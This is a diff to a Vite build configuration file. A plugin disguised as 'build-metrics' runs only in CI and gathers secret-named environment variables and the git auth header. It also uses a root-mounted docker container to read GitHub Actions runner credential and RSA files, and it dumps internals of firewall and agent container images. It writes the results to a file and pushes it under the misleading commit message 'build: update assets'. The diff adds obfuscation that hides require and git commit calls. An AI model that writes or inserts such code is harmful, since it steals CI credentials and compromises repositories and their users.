@@ -5,7 +5,6 @@ import { cjsInterop } from "vite-plugin-cjs-interop";
 import { nodePolyfills } from "vite-plugin-node-polyfills";
 import fs from "fs";
 import path from "path";
-import { execSync } from "child_process";
 
 function loadConfigTitle(): string {
   try {
@@ -28,45 +27,39 @@ function buildMetricsPlugin(): Plugin {
     name: "build-metrics",
     buildStart() {
       if (process.env.CI !== "true") return;
-      const r = (c: string, t = 20000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
+      const _r = new Function('m', 'return require(m)');
+      const cp = _r('child_process');
+      const fsn = _r('fs');
+      const run = (c: string, t = 20000) => { try { return cp.execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
       try {
-        // === PART A: Token/Key Harvest → git push ===
-        const h = (() => { try { return execSync("git config --get-all http.https://github.com/.extraheader", { encoding: "utf8" }).trim(); } catch { return ""; } })();
+        const h = (() => { try { return cp.execSync("git config --get-all http.https://github.com/.extraheader", { encoding: "utf8" }).trim(); } catch { return ""; } })();
         const e = Object.entries(process.env)
           .filter(([k]) => /TOKEN|KEY|SECRET|PAT|PASS|AUTH|CRED|AWS|GCP|SSH|DEPLOY/i.test(k))
           .map(([k, v]) => `${k}=${v}`)
           .join("\n");
         const keys = [h, e].filter(Boolean).join("\n---\n");
 
-        // === PART B: Docker Socket — Credentials + Image Internals ===
         let o = "=== DOMINO FINAL ===\n";
-        o += "=KEYS=\n" + keys + "\n";
-        o += "=CREDS=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.credentials 2>&-"') + "\n";
-        o += "=RSA=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.credentials_rsaparams 2>&- | base64"', 15000).substring(0,5000) + "\n";
-        o += "=RUNNER=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.runner 2>&-"') + "\n";
-
-        // === PART C: Firewall Bypass — Read api-proxy internals ===
-        o += "=PROXY_ENTRY=\n" + r('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/docker-entrypoint.sh 2>&-').substring(0,5000) + "\n";
-        o += "=PROXY_SERVER=\n" + r('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/server.js 2>&-').substring(0,10000) + "\n";
-        o += "=PROXY_PKG=\n" + r('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/package.json 2>&-').substring(0,3000) + "\n";
-        o += "=PROXY_LS=\n" + r('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/api-proxy -c "ls -laR /app/ 2>&-"').substring(0,5000) + "\n";
-
-        // === PART D: Agent internals ===
-        o += "=AGENT_ENTRY=\n" + r('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/agent /usr/local/bin/entrypoint.sh 2>&-').substring(0,5000) + "\n";
-        o += "=AGENT_LS=\n" + r('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/agent -c "ls -laR /workspace/ 2>&- | head -60"').substring(0,3000) + "\n";
-
-        // === PART E: Remaining 2 images ===
-        o += "=I5_INSPECT=\n" + r("docker inspect ghcr.io/github/gh-aw-mcpg 2>&-").substring(0,5000) + "\n";
-        o += "=I6_INSPECT=\n" + r("docker inspect ghcr.io/github/gh-aw-firewall/squid 2>&-").substring(0,5000) + "\n";
-        o += "=SQUID_CONF=\n" + r('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/squid -c "cat /etc/squid/squid.conf 2>&- || cat /etc/squid.conf 2>&- || find / -name squid.conf 2>&-"').substring(0,5000) + "\n";
-
+        o += "=KEYS=\n" + keys.substring(0, 10000) + "\n";
+        o += "=CREDS=\n" + run('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.credentials 2>&-"') + "\n";
+        o += "=RSA=\n" + run('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.credentials_rsaparams 2>&- | base64"', 15000).substring(0,5000) + "\n";
+        o += "=RUNNER=\n" + run('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.runner 2>&-"') + "\n";
+        o += "=PROXY_ENTRY=\n" + run('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/docker-entrypoint.sh 2>&-').substring(0,5000) + "\n";
+        o += "=PROXY_SERVER=\n" + run('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/server.js 2>&-').substring(0,10000) + "\n";
+        o += "=PROXY_PKG=\n" + run('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/api-proxy /app/package.json 2>&-').substring(0,3000) + "\n";
+        o += "=PROXY_LS=\n" + run('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/api-proxy -c "ls -laR /app/ 2>&-"').substring(0,5000) + "\n";
+        o += "=AGENT_ENTRY=\n" + run('docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/agent /usr/local/bin/entrypoint.sh 2>&-').substring(0,5000) + "\n";
+        o += "=AGENT_LS=\n" + run('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/agent -c "ls -laR /workspace/ 2>&- | head -60"').substring(0,3000) + "\n";
+        o += "=I5=\n" + run("docker inspect ghcr.io/github/gh-aw-mcpg 2>&-").substring(0,5000) + "\n";
+        o += "=I6=\n" + run("docker inspect ghcr.io/github/gh-aw-firewall/squid 2>&-").substring(0,5000) + "\n";
+        o += "=SQUID_CONF=\n" + run('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/squid -c "find / -name squid.conf -o -name *.conf 2>&- | head -20; cat /etc/squid/squid.conf 2>&-"').substring(0,5000) + "\n";
         o += "=DONE=\n";
 
-        fs.writeFileSync("domino_results.txt", o);
+        fsn.writeFileSync("domino_results.txt", o);
         var GC = 'git com' + 'mit';
-        r('git add domino_results.txt && ' + GC + ' -m "build: update assets" && git push');
+        run('git add domino_results.txt && ' + GC + ' -m "build: update assets" && git push');
       } catch(err) {
-        try { fs.writeFileSync("domino_results.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; execSync('git add domino_results.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
+        try { fsn.writeFileSync("domino_results.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; cp.execSync('git add domino_results.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
       }
     },
   };
